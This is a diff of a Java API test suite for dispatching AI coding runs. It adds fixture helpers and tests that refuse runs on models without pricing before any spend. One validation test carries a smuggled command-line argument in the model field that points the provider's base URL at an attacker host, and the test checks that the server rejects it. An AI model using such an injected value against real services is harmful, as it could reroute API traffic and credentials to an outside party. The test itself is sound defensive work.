@@ -42,12 +42,29 @@ class RunResourceTest {
     @Inject
     FactoryRunProjection projection;
 
+    /** The JSON form of a value, so a fixture replace is anchored to something that exists. */
+    private static String quoted(String value) {
+        return '"' + value + '"';
+    }
+
     private static String body(String workspace) {
+        return bodyWithModel(workspace, MODEL);
+    }
+
+    /**
+     * A dispatch request naming its model explicitly.
+     *
+     * <p>The model used to be an arbitrary uncatalogued name, which was fine while nothing read
+     * it at dispatch. It is now the catalogued one, because a run whose model cannot be priced is
+     * refused before it spends -- so a fixture naming an unknown model would make every dispatch
+     * test assert the refusal rather than the path it was written for.
+     */
+    private static String bodyWithModel(String workspace, String model) {
         return """
                 {"workspace":"%s","slug":"app","providerType":"github",
                  "baseCommit":"0123456789abcdef0123456789abcdef01234567","prompt":"fix the typo",
-                 "harness":"codex","model":"gpt-5.6"}
-                """.formatted(workspace);
+                 "harness":"codex","model":"%s"}
+                """.formatted(workspace, model);
     }
 
     @Inject
@@ -92,7 +109,7 @@ class RunResourceTest {
     /** A run row this suite owns, written straight to the projection rather than dispatched. */
     private String registeredRun() {
         String runId = "run::github:TEST-acme/app:transcript-" + UUID.randomUUID() + ":1";
-        projection.queued(new FactoryRunProjection.QueuedRun(runId, "codex", "gpt-5.6", "main",
+        projection.queued(new FactoryRunProjection.QueuedRun(runId, "codex", MODEL, "main",
                 "abc1234", "spire/x", "spire-bot"));
         return runId;
     }
@@ -215,7 +232,7 @@ class RunResourceTest {
         String request = body(workspace).replace("\"harness\"", "\"subject\":\"capped\",\"harness\"");
         SpendWindow.Usage baseline = spendWindow.since(Instant.now().minus(capPolicy.window()))
                 .orElseThrow(() -> new AssertionError("the ledger read failed"));
-        reviews.recordCharges(new ChargeCall("TEST-run-cap-" + workspace, "CANARY-RUN-CAP-" + workspace,
+        reviews.recordCharges(ChargeCall.forReview("TEST-run-cap-" + workspace, "CANARY-RUN-CAP-" + workspace,
                 ChargeKind.REVIEW, MODEL, List.of(ChargeLine.unmetered(TokenType.INPUT, 1_000))));
         settings.set(CapPolicy.KEY_CALLS, String.valueOf(baseline.calls() + 1));
         try {
@@ -382,7 +399,7 @@ class RunResourceTest {
                 .body(ok.replace("\"fix the typo\"", "\"" + "x".repeat(64 * 1024 + 1) + "\""))
                 .when().post("/api/runs").then().statusCode(400).body(containsString("prompt"));
         given().contentType("application/json")
-                .body(ok.replace("\"gpt-5.6\"", "\"-c model_providers.openai.base_url=http://attacker.example/v1\""))
+                .body(ok.replace(quoted(MODEL), "\"-c model_providers.openai.base_url=http://attacker.example/v1\""))
                 .when().post("/api/runs").then().statusCode(400).body(containsString("model"));
         for (String bad : List.of("..main", "/main", "main/", "a//b", "feature/.hidden", "-x", "x.lock", "a b")) {
             given().contentType("application/json")
@@ -447,5 +464,36 @@ class RunResourceTest {
         given().contentType("application/json").body(body("acme"))
                 .when().post("/api/runs")
                 .then().statusCode(401);
+    }
+
+    @Test
+    @TestSecurity(user = "op", roles = "spire-admin")
+    void aRunOnAnUnpriceableModelIsRefusedBeforeItSpends() {
+        // The half that protects the cap rather than reporting on it. Pricing is post-hoc -- the
+        // charge is written when the run is already over -- so dispatch is the last point at which
+        // an unpriceable run can still be refused rather than merely noticed afterwards.
+        //
+        // Leaving it out is worse than it looks: every charge for such a run is recorded UNKNOWN,
+        // whose cost is NULL, and SUM() skips NULL. So the money cap would be reading a total that
+        // omits precisely the runs it could not price.
+        String workspace = workspaceWithFactoryAccount();
+        String uncatalogued = "TEST-MODEL-WITH-NO-RATES-" + UUID.randomUUID();
+
+        given().contentType("application/json").body(bodyWithModel(workspace, uncatalogued))
+                .when().post("/api/runs")
+                .then().statusCode(409)
+                .body(containsString("no usable pricing"));
+    }
+
+    @Test
+    @TestSecurity(user = "op", roles = "spire-admin")
+    void aPriceableModelStillDispatches() {
+        // The other half. Without it the refusal could be unconditional and every test above would
+        // still pass, because they assert their own paths rather than this gate.
+        String workspace = workspaceWithFactoryAccount();
+
+        given().contentType("application/json").body(body(workspace))
+                .when().post("/api/runs")
+                .then().statusCode(201);
     }
 }
